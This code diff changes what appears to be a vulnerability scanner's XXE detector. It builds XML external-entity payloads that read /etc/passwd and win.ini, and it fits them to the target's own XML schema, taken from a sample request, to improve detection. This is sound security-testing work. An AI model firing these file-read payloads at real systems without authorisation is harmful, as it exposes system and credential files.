@@ -255,16 +255,44 @@ async def detect_ssrf_reflected(
 # Classic external-entity file read. VALIDATED only if the parsed entity's file
 # content comes back in the response. Only ever sent to endpoints that advertise
 # XML handling (accepts/returns xml) so we do not spray XML at JSON APIs.
-_XXE_BODY = (
-    '<?xml version="1.0" encoding="UTF-8"?>'
-    '<!DOCTYPE osop [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
-    "<osop><data>&xxe;</data></osop>"
+_XXE_FILES = (
+    ("file:///etc/passwd", _TRAVERSAL_MARKERS),
+    ("file:///c:/windows/win.ini", ("[extensions]", "[fonts]")),
 )
-_XXE_BODY_WIN = (
-    '<?xml version="1.0" encoding="UTF-8"?>'
-    '<!DOCTYPE osop [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
-    "<osop><data>&xxe;</data></osop>"
-)
+
+
+def _xxe_body(file_uri: str, root: str = "osop", field: str = "data") -> str:
+    """Build an external-entity file-read doc against a specific XML SCHEMA.
+
+    Real XML endpoints validate the document against their own schema and reject
+    a foreign root/field before the parser ever reflects the entity — so a fixed
+    ``<osop><data>`` payload only ever confirms on a target that happens to accept
+    that shape. Targeting the app's OWN root+field (discovered from a sample
+    request, e.g. ginandjuice.shop's ``<stockCheck><productId>``) is what lets the
+    entity reach a reflected field on a real target."""
+    return (
+        '<?xml version="1.0" encoding="UTF-8"?>'
+        f'<!DOCTYPE {root} [<!ENTITY xxe SYSTEM "{file_uri}">]>'
+        f"<{root}><{field}>&xxe;</{field}></{root}>"
+    )
+
+
+def _xxe_schemas_from_sample(sample_xml: Optional[str]) -> List[Tuple[str, str]]:
+    """Derive (root_tag, first_child_tag) from a sample XML request body so the
+    payload can be built against the app's real schema. Returns [] when no usable
+    schema is found; the caller always also tries the generic <osop><data> shape."""
+    if not sample_xml:
+        return []
+    import re as _re
+
+    tags = _re.findall(r"<([A-Za-z_][\w.-]*)\b[^>]*>", sample_xml)
+    # skip the XML declaration / DOCTYPE artifacts
+    tags = [t for t in tags if t.lower() not in ("xml", "doctype")]
+    if len(tags) >= 2:
+        return [(tags[0], tags[1])]
+    if len(tags) == 1:
+        return [(tags[0], "data")]
+    return []
 
 
 async def detect_xxe(
@@ -272,10 +300,25 @@ async def detect_xxe(
     url: str,
     *,
     method: str = "POST",
+    sample_xml: Optional[str] = None,
 ) -> Optional[Dict[str, Any]]:
     """POST an XML doc with an external-entity file read. VALIDATED only if the
-    file signature is reflected in the response."""
-    for body, markers in ((_XXE_BODY, _TRAVERSAL_MARKERS), (_XXE_BODY_WIN, ("[extensions]", "[fonts]"))):
+    file signature is reflected in the response.
+
+    When ``sample_xml`` (a legitimate request body captured from the target) is
+    provided, the payload is ALSO built against the app's own root+field schema,
+    not just the generic ``<osop><data>`` shape — the recall fix that lets this
+    detect XXE on schema-validating endpoints like a stock-check API. Confirmation
+    is unchanged: a real local-file signature must appear in the response, so a
+    blind/OOB-only or entity-hardened parser still (correctly) does NOT confirm."""
+    # Schemas to try: the app's own (from the sample) first, then the generic.
+    schemas = _xxe_schemas_from_sample(sample_xml) + [("osop", "data")]
+    attempts: List[Tuple[str, Tuple[str, ...], str, str]] = []
+    for root, field in schemas:
+        for file_uri, markers in _XXE_FILES:
+            attempts.append((_xxe_body(file_uri, root, field), markers, root, field))
+
+    for body, markers, root, field in attempts:
         try:
             r = await client.request(
                 method, url, content=body,
@@ -288,9 +331,12 @@ async def detect_xxe(
             return {
                 "technique": "xxe",
                 "endpoint": url,
-                "payload": "external-entity file:// read",
+                "payload": f"external-entity file:// read via <{root}><{field}>",
                 "http_status": r.status_code,
-                "proof": "XML parser resolved an external entity and reflected a local file",
+                "proof": (
+                    "XML parser resolved an external entity and reflected a local "
+                    f"file (schema <{root}><{field}>)"
+                ),
                 "confidence": 1.0,
             }
     return None
